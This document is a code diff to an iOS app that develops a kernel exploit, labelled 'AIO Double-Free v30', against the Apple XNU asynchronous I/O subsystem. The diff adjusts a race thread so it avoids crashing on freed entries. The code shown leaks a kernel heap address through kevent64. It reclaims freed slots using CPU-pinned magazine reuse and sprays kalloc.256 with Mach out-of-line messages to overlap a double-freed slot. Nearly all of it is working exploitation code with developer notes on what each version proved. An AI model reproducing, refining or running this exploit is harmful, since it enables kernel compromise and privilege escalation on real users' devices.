@@ -269,22 +269,20 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     while (!atomic_load_explicit(&s->start, memory_order_acquire));
     while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
         if (aio_error(s->trigger) == 0) {
-            ssize_t r = aio_return(s->trigger);
-            if (r >= 0) {
-                atomic_fetch_add(&s->freed, 1);
-                // If rcbs is set, reclaim via aio_read (LIFO reuse).
-                // Check ALL return values — any failure means slot wasn't filled.
-                if (s->rcbs && s->nrcbs > 0) {
-                    int ok = 0;
-                    for (int i = 0; i < s->nrcbs; i++) {
-                        if (aio_read(&s->rcbs[i]) == 0) ok++;
-                    }
-                    if (ok == s->nrcbs) {
-                        atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
-                    }
+            // v30: worker already freed entry via aio_entry_unref→zfree.
+            // Calling aio_return would TAILQ_REMOVE from doneq using
+            // zfree-corrupted TAILQ pointers → random kernel heap corruption.
+            atomic_fetch_add(&s->freed, 1);
+            if (s->rcbs && s->nrcbs > 0) {
+                int ok = 0;
+                for (int i = 0; i < s->nrcbs; i++) {
+                    if (aio_read(&s->rcbs[i]) == 0) ok++;
                 }
-                return NULL;
+                if (ok == s->nrcbs) {
+                    atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
+                }
             }
+            return NULL;
         }
     }
     return NULL;
@@ -356,7 +354,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO Double-Free v29" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO Double-Free v30" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5742,7 +5740,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Double-Free v29 =========="];
+    [self appendLog:@"\n========== AIO Double-Free v30 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5761,7 +5759,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:@"FAIL: could not create temp file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO Double-Free v29" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO Double-Free v30" forState:UIControlStateNormal];
         });
         return;
     }
@@ -5776,11 +5774,11 @@ static void *e2_free_and_ool_racer(void *arg) {
     static struct aiocb rcbs[AIO_NRECLAIM];
     static char rbufs[AIO_NRECLAIM][8192];   // exact fit for 0x2000 nbytes
 
-    // ---- Phase A v28: SIGEV_KEVENT + tight kevent64 poll ----
+    // ---- Phase A v30: SIGEV_KEVENT + tight kevent64 poll ----
     // v25/v26 proved the no-kevent approach eliminates crashes, but without a
     // kernel address leak we can't craft valid OOL payloads for Phase D overlap.
     //
-    // v29: SIGEV_KEVENT on tcb, kevent64(timeout=0) IMMEDIATELY after racer,
+    // v30: SIGEV_KEVENT on tcb, kevent64(timeout=0) IMMEDIATELY after racer,
     // BEFORE rcbs[0] completes. rcbs[0] occupies the reclaimed slot → live entry
     // with valid procp → filt_aioprocess safe. v18 proved kevent64 returns
     // cached ext[0]/ext[1] for completed AIO events, and filt_aioprocess skips
@@ -5794,7 +5792,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     uint64_t entryAddr = 0;  // kernel address of reclaimed slot S
 
     for (int attempt = 0; attempt < 5; attempt++) {
-        [self appendLog:[NSString stringWithFormat:@"Phase A v28 attempt %d/5", attempt + 1]];
+        [self appendLog:[NSString stringWithFormat:@"Phase A v30 attempt %d/5", attempt + 1]];
 
         // Fresh kq per attempt. If kevent64 misses, we leak kq rather
         // than close(kq) with an unconsumed (dangling) knote still attached.
@@ -5816,7 +5814,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         tcb.aio_sigevent.sigev_signo = kq;                  // kqueue fd in signo field
         // sigev_value = 0 → ext[0]=0 in cached kevent (v18 confirmed)
 
-        // v28: vary rcbs[0].aio_nbytes per attempt to correlate ext[1]
+        // v30: vary rcbs[0].aio_nbytes per attempt to correlate ext[1]
         // If ext[1] tracks nbytes, we confirm control over returnval field.
         uint16_t marker = (uint16_t)(0x2000 + attempt * 0x100);
         for (int i = 0; i < AIO_NRECLAIM; i++) {
@@ -5850,8 +5848,8 @@ static void *e2_free_and_ool_racer(void *arg) {
         bool reclaimed = atomic_load(&rs.reclaim_done);
 
         if (freed == 0) {
-            while (aio_error(&tcb) == EINPROGRESS) usleep(500);
-            aio_return(&tcb);
+            // v30: worker already freed tcb. Don't aio_return here —
+            // it would TAILQ_REMOVE with zfree-corrupted pointers.
             [self appendLog:@"  race lost, retrying"];
             continue;
         }
@@ -5860,7 +5858,7 @@ static void *e2_free_and_ool_racer(void *arg) {
             continue;
         }
 
-        // ---- v28: IMMEDIATE kevent64 poll (timeout=0) ----
+        // ---- v30: IMMEDIATE kevent64 poll (timeout=0) ----
         // rcbs[0] is alive (on activeq, procp valid). tcb's knote has
         // KN_QUEUED → filt_aioprocess returns cached ext[] without TAILQ_REMOVE.
         struct kevent64_s kev = {};
@@ -5872,7 +5870,7 @@ static void *e2_free_and_ool_racer(void *arg) {
                 kev.ident, kev.ext[0], kev.ext[1]]];
             if (kev.ident != 0) {
                 entryAddr = kev.ident;
-                [self appendLog:[NSString stringWithFormat:@"*** PHASE A v28: KERNEL ADDR LEAK ident=0x%llx ***", entryAddr]];
+                [self appendLog:[NSString stringWithFormat:@"*** PHASE A v30: KERNEL ADDR LEAK ident=0x%llx ***", entryAddr]];
             }
             knoteConsumed = true;
         } else if (nev == 0) {
@@ -5885,13 +5883,13 @@ static void *e2_free_and_ool_racer(void *arg) {
         for (int i = 0; i < AIO_NRECLAIM; i++)
             while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
 
-        // v25-style double-free confirmation via aio_error
+        // v30-style double-free confirmation via aio_error
         int tcb_err = aio_error(&tcb);
         int rcb0_err = aio_error(&rcbs[0]);
         [self appendLog:[NSString stringWithFormat:@"  aio_error(tcb)=%d aio_error(rcbs[0])=%d", tcb_err, rcb0_err]];
 
         if (tcb_err == EINVAL && rcb0_err == 0) {
-            [self appendLog:@"*** PHASE A v28: DOUBLE-FREE CONFIRMED ***"];
+            [self appendLog:@"*** PHASE A v30: DOUBLE-FREE CONFIRMED ***"];
             [self appendLog:@"  >> tcb freed+reclaimed (not found on any queue) <<"];
             [self appendLog:@"  >> rcbs[0] occupies reclaimed slot (valid on doneq) <<"];
         } else if (tcb_err == 0) {
@@ -5920,14 +5918,14 @@ static void *e2_free_and_ool_racer(void *arg) {
     // rcbs[0] occupies slot S (entryAddr). After Phase A kevent64,
     // filt_aioprocess cached path skipped TAILQ_REMOVE, so rcbs[0]
     // is still on doneq. Read fields before freeing.
-    // v29: Set CPU affinity BEFORE aio_return so the freed slot S
+    // v30: Set CPU affinity BEFORE aio_return so the freed slot S
     // goes to CPU 42's per-CPU magazine (same CPU as racer).
     // This enables Phase C's LIFO reclaim from the same magazine.
     [self appendLog:@"\n--- Phase B: Entry field probe ---"];
     {
         int rcb0_err = aio_error(&rcbs[0]);
         [self appendLog:[NSString stringWithFormat:@"  aio_error(rcbs[0])=%d (pre-free)", rcb0_err]];
-        aio_set_thread_affinity(42);  // v29: set BEFORE free for same-CPU magazine
+        aio_set_thread_affinity(42);  // v30: set BEFORE free for same-CPU magazine
         ssize_t rcb0_ret = aio_return(&rcbs[0]);
         [self appendLog:[NSString stringWithFormat:@"  aio_return(rcbs[0])=%zd (freed slot S → CPU 42 mag)", rcb0_ret]];
     }
@@ -6018,7 +6016,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     // the overlapped slot (byte-offset payload).
     // NO kevent, NO aio_return on overlapped entry → no crash.
 
-    [self appendLog:@"\n--- Phase D v29: v20-style drain + overlap ---"];
+    [self appendLog:@"\n--- Phase D v30: v20-style drain + overlap ---"];
 
     // OOL payload: byte-offset pattern for field mapping
     enum { kDrainOolSize = 256 };
@@ -6033,7 +6031,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         mach_msg_ool_descriptor_t ool;
     } DrainMsg;
 
-    // ---- Phase D v29: v20-style drain + E2 + single OOL overlap ----
+    // ---- Phase D v30: v20-style drain + E2 + single OOL overlap ----
     // Strategy: Pre-E2 drain of kalloc.256 (9 OOL msgs via 3 ports × 3 sends)
     // changes freelist state so the double-freed slot moves closer to the
     // magazine head. Then E2 claims one copy, single OOL hits the other.
@@ -6171,11 +6169,11 @@ static void *e2_free_and_ool_racer(void *arg) {
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO Double-Free v29 Complete =========="];
+    [self appendLog:@"========== AIO Double-Free v30 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO Double-Free v29" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO Double-Free v30" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
